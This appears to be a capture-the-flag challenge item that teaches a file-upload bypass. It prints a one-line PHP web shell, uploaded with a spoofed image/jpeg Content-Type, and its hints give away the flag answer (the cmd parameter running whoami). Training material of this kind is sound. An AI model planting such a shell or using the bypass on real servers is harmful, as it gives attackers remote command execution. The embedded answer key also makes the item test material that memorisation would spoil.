title: Malicious Upload
description:
A file upload form only checks the Content-Type header, not the actual file content or extension.

You upload a PHP web shell:
```
Filename: shell.php
Content-Type: image/jpeg  (spoofed)
Body: <?php system($_GET['cmd']); ?>
```

The server accepts it because Content-Type says 'image/jpeg'.

After uploading to /uploads/shell.php, what URL would you visit to run `whoami`?

Submit the query string parameter format: flag{parameter=value}
hints: The PHP shell uses $_GET['cmd'] to receive commands
The parameter name is 'cmd' and the value is the command to execute
